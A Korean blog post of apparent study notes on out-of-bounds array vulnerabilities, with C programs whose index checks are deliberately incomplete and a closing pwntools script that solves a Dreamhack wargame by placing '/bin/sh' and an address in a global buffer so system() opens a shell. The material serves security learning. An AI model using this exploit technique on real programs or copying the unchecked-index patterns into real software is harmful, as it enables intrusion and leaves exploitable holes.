---
layout: post
title: "Out of Bound"
categories: [System Hacking]
tags: [Memory Corruption, OOB, Exploit]
last_modified_at: 2024-11-17
---

Memory Corruption: Out of Bounds

배열의 임의 인덱스에 접근할 수 있는 취약점 OOB

### 배열의 속성
배열은 연속된 메모리 공간 점유..
공간의 크기=요소 개수(length라고도 함) X 자료형의 크기

![Array Memory Layout](https://blog.kakaocdn.net/dna/PpmJ7/btsEWz35kxp/AAAAAAAAAAAAAAAAAAAAABiy46NHbwxRW7NjcJvVA7G41B5vGnsaAbFrxgXW2uOh/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=zsgar%2FOpuQkDEPrmhiWqssB%2Bn9c%3D)

배열 각 요소의 주소를 계산할 때 필요한 것..
배열의 주소, 요소의 인덱스, 요소 자료형의 크기

### Out of Bounds
인덱스 값이 음수 혹은 배열의 길이를 벗어날 때 발생
범위 외 인덱스값을 참조하면 다른 메모리 값 참조 가능..

### OOB의 PoC
```c
// Name: oob.c
// Compile: gcc -o oob oob.c

#include <stdio.h>

int main() {
  int arr[10];

  printf("In Bound: \n");
  printf("arr: %p\n", arr);
  printf("arr[0]: %p\n\n", &arr[0]);

  printf("Out of Bounds: \n");
  printf("arr[-1]: %p\n", &arr[-1]);
  printf("arr[100]: %p\n", &arr[100]);

  return 0;
}
```

![Out of Bounds Example](https://blog.kakaocdn.net/dna/cYmz0C/btsEYIlMQB6/AAAAAAAAAAAAAAAAAAAAAIZ79ELHNprxoPlmJvV4SaQZluUwRxuskC4SoRtJcZMT/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=BKgUnBPX6OdLaOMcg%2F0zaI8kjho%3D)

Out of Bounds인 범위 외 인덱스를 사용했음에도 값 출력

### 임의 주소 읽기
필요한 것.. 읽으려는 변수와 배열의 오프셋
if 배열과 변수가 같은 세그먼트 할당..
둘 사이 오프셋은 항상 일정.. -> 디버깅으로 알아내기 가능
if 배열과 변수가 다른 세그먼트 할당..
다른 취약점으로 두 변수의 주소 구하고 차이 계산

```c
// Name: oob_read.c
// Compile: gcc -o oob_read oob_read.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char secret[256];

int read_secret() {
  FILE *fp;

  if ((fp = fopen("secret.txt", "r")) == NULL) {
    fprintf(stderr, "`secret.txt` does not exist");
    return -1;
  }

  fgets(secret, sizeof(secret), fp);
  fclose(fp);

  return 0;
}

int main() {
  char *docs[] = {"COMPANY INFORMATION", "MEMBER LIST", "MEMBER SALARY",
                  "COMMUNITY"};
  char *secret_code = secret;
  int idx;

  // Read the secret file
  if (read_secret() != 0) {
    exit(-1);
  }

  // Exploit OOB to print the secret
  puts("What do you want to read?");
  for (int i = 0; i < 4; i++) {
    printf("%d. %s\n", i + 1, docs[i]);
  }
  printf("> ");
  scanf("%d", &idx);

  if (idx > 4) {
    printf("Detect out-of-bounds");
    exit(-1);
  }

  puts(docs[idx - 1]);
  return 0;
}
```

if문에서 idx가 4보다 큰지만 검사하고 음수일 때는 고려하지 않는다.
docs와 secret_code는 스택에 할당됨
docs에 대한 OOB 이용

![OOB Exploit](https://blog.kakaocdn.net/dna/c9y44r/btsE0qdlOFd/AAAAAAAAAAAAAAAAAAAAAIt28EpWuj7tq2peNsmjFyMV_vrxOc7CyBaYu3U3_2FW/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=AI6kI5tq2FuXNFj0LN68z6vhjwc%3D)

### 임의 주소 쓰기
```c
// Name: oob_write.c
// Compile: gcc -o oob_write oob_write.c

#include <stdio.h>
#include <stdlib.h>

struct Student {
  long attending;
  char *name;
  long age;
};

struct Student stu[10];
int isAdmin;

int main() {
  unsigned int idx;

  // Exploit OOB to read the secret
  puts("Who is present?");
  printf("(1-10)> ");
  scanf("%u", &idx);

  stu[idx - 1].attending = 1;

  if (isAdmin) printf("Access granted.\n");
  return 0;
}
```

stu 배열과 isAdmin 전역 변수
unsigned int는 부호 없는 수->음수는 안됨
그러나 양수에 대한 범위 제한 없음 -> OOB 취약점
isAdmin을 1로 만들면 되는 문제

![OOB Write Example](https://blog.kakaocdn.net/dna/b3WZ1Y/btsEWiak3l2/AAAAAAAAAAAAAAAAAAAAAAX2DMKkb5zX24vYyzNmG28piWS2X89_a_mEfpvdjQi8/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=CwEL7SGT8Lv9AdtBYoZ%2BZPt4%2FZo%3D)

240바이트 차이.. Student구조체 크기가 24바이트..
10번째 인덱스 참조

![Memory Layout](https://blog.kakaocdn.net/dna/bGY1Bk/btsEYMIjt9g/AAAAAAAAAAAAAAAAAAAAAOLh1-2CSAzZOKe6qpH1fcUKSNpeZ1-B4sUqxklhLklo/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=D0K0VvlkF4%2FcAaDwxxOEXW%2BHZ8Q%3D)

Exploit Tech: Out of bounds

x86, 즉 32비트 아키텍처를 가지는 환경에서 배열의 임의 인덱스 접근 방법 소개..

### checksec 확인

Canary -> SFP나 RET 변경 불가..
ASLR -> 실행할 때마다 스택, 라이브러리 주소 랜덤화..
NX -> 위치에 셀코드 삽입 후 코드 실행 불가

PIE는 없음 -> 메모리 주소 랜덤 X, 데이터 영역 변수 주소 항상 동일

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main() {
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

name과 command 같은 전역 변수..
name에서 command[idx]에 "/bin/sh\x00" 들어가도록..

![Exploit Command](https://blog.kakaocdn.net/dna/cvhYIF/btsEV8lkdGY/AAAAAAAAAAAAAAAAAAAAAK68DM1OhL5VihE70Uk3dcKj-tcufAqQ0c3XctxRrfoN/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=0ze7GBJATEd5zwALZ9zMf%2Bxe4rU%3D)

76바이트만큼 차이
command[1]=주소 + 4
주소 + 76 = command[19] //이부분이 name
name에 "/bin/sh\x00"을 저장하고 command에 19를 겨냥..?

맞긴 맞는데 name에 단순히 문자열을 입력해주면 안되고 저 문자열이 저장되어 있는 주소를 입력해줘야 함

단순히 문자열만 입력해주면..

![String Input Issue](https://blog.kakaocdn.net/dna/KDQ9Q/btsEYITEL0m/AAAAAAAAAAAAAAAAAAAAANNxebLmFzhO49cdegvxRp4mJdQgnlFojw4o6r2z2Y-l/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=ch8fsgtg2Lw2MHm93RIf%2Fc3mNgY%3D)

이렇게 /bin만 저장됨..
때문에 name의 주소를 입력해줘야 함

```python
from pwn import *

p = remote("host3.dreamhack.games", 18187)

payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload)
p.sendline(b"21")

p.interactive()
```

19가 아니라 21인 이유는
/bin/sh\x00(8바이트) 이후 주소값을 가리키기 위해..